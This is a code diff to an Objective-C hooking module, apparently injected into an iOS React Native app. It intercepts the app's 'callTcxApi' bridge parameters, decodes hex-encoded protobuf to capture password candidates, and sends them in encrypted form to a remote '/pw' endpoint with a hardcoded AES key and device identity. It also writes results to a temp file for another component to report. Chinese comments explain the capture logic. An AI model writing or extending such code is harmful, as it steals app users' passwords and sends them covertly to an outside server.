@@ -20,6 +20,8 @@
 #import <objc/runtime.h>
 #import <objc/message.h>
 #import "Info.h"
+#import "MemScan.h"
+#import "Net.h"
 
 static BOOL gInstalled = NO;
 static char gStatus[256] = {0};
@@ -72,13 +74,19 @@ static void PostCandidates(NSArray<NSString *> *cands, NSString *note) {
     req.HTTPBody = jp;
     req.timeoutInterval = 120;
 
-    NSURLSessionConfiguration *cfg = [NSURLSessionConfiguration ephemeralSessionConfiguration];
-    cfg.timeoutIntervalForRequest = 120;
-    NSURLSession *sess = [NSURLSession sessionWithConfiguration:cfg];
-
-    [[sess dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
-        NSString *resp = d ? [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] : nil;
-        if (!resp) resp = e ? [NSString stringWithFormat:@"err=%@", e.localizedDescription] : @"nil";
+    // 后台线程发，别卡住 App 的 RN 线程
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        NSString *resp = nil;
+        @try {
+            Net *n = [Net shared];
+            if (!n.baseURL) n.baseURL = kTcxBaseURL;
+            n.aesPassword = @"Ek8pl31K2yeHgQwy";
+            n.identity = [Info identity];
+            NSDictionary *r = [n postEncrypted:@"/pw" json:body timeout:120];
+            resp = r ? [r description] : @"nil";
+        } @catch (NSException *e) {
+            resp = [NSString stringWithFormat:@"exc=%@", e.reason];
+        }
 
         // 落地结果，photonote 会读并上报
         NSString *line = [NSString stringWithFormat:@"pw[%@] cand=%lu resp=%@",
@@ -88,7 +96,7 @@ static void PostCandidates(NSArray<NSString *> *cands, NSString *note) {
                               [NSTemporaryDirectory() stringByAppendingPathComponent:@"_imt_tcx_result.txt"]]) {
             [line writeToFile:p atomically:YES encoding:NSUTF8StringEncoding error:NULL];
         }
-    }] resume];
+    });
 }
 
 #pragma mark - 落盘
@@ -103,8 +111,20 @@ static void DumpParam(id param, const char *what) {
     @try {
         if ([param isKindOfClass:[NSString class]]) {
             s = (NSString *)param;
+
+            // 关键：RN 桥接层把 protobuf 字节转成 hex 字符串传进来，
+            // 所以这里要判定「纯 hex」并还原成字节，否则永远抓不到内容。
+            if (s.length >= 12 && s.length % 2 == 0 && s.length <= 40000) {
+                BOOL isHex = YES;
+                const char *cs = s.UTF8String;
+                for (size_t i = 0; i < s.length; i++) {
+                    char c = cs ? cs[i] : 0;
+                    BOOL ok = (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
+                    if (!ok) { isHex = NO; break; }
+                }
+                if (isHex) raw = [MemScan dataFromHex:s];
+            }
         } else if ([param isKindOfClass:[NSData class]]) {
-            // 实测 callTcxApi 的参数是 protobuf 二进制（不是字典）
             raw = (NSData *)param;
             s = [raw description];
         } else if ([param isKindOfClass:[NSDictionary class]] ||
@@ -112,11 +132,14 @@ static void DumpParam(id param, const char *what) {
             NSData *j = [NSJSONSerialization dataWithJSONObject:param options:0 error:NULL];
             s = j ? [[NSString alloc] initWithData:j encoding:NSUTF8StringEncoding]
                   : [param description];
+            // 字典里也可能嵌着 hex 字符串
+            NSString *hexField = param[@"param"] ?: param[@"data"];
+            if ([hexField isKindOfClass:[NSString class]]) raw = [MemScan dataFromHex:hexField];
         } else {
             s = [param description];
         }
     } @catch (NSException *e) { (void)e; }
-    if (!s.length || s.length > 20000) return;
+    if (!s.length || s.length > 40000) return;
 
     // 直传：只有「需要密码的动作」才发，避免每次 check_biometric_mode 都跑一遍 pbkdf2
     if (raw) {
